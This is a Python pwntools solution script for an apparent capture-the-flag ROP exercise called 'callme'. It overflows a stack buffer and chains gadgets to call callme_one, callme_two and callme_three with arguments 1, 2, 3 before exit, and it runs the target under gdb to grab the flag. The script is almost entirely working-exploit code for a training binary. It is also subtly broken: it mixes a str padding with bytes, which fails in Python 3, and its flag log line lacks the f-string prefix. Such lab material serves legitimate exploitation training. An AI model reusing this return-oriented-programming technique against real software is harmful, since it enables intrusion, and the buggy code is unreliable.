#!/usr/bin/python3

from pwn import *

#context.log_level = 'DEBUG'

filename = './callme'

binary = ELF(filename)
rop = ROP(filename)

c_one_plt = binary.plt['callme_one']
c_two_plt = binary.plt['callme_two']
c_three_plt = binary.plt['callme_three']
exit_plt = binary.plt['exit']

rdi_rsi_rdx_addr = rop.search(regs=['rdi', 'rsi', 'rdx']).address
rdi_addr = rop.search(regs=['rdi']).address
ret_addr = rop.search(regs=[]).address

padding = 'A' * 40

payload = padding

#load callme_* arguments
payload += p64(rdi_rsi_rdx_addr)
payload += p64(1)
payload += p64(2)
payload += p64(3)

# callme_one(1, 2, 3)
payload += p64(c_one_plt)

#load callme_* arguments
payload += p64(rdi_rsi_rdx_addr)
payload += p64(1)
payload += p64(2)
payload += p64(3)

# callme_two(1, 2, 3)
payload += p64(c_two_plt)

#load callme_* arguments
payload += p64(rdi_rsi_rdx_addr)
payload += p64(1)
payload += p64(2)
payload += p64(3)

# callme_three(1, 2, 3)
payload += p64(c_three_plt)

#load exit argument
payload += p64(rdi_addr)
payload += p64(0)

# exit(0)
payload += p64(exit_plt)

p = process(filename)
gdb.attach(p, '''
        break *0x401a56
        continue
        ''')

p.recvuntil('> ')

p.sendline(payload)

log.info("Flag: {p.recv(1024).decode()}")
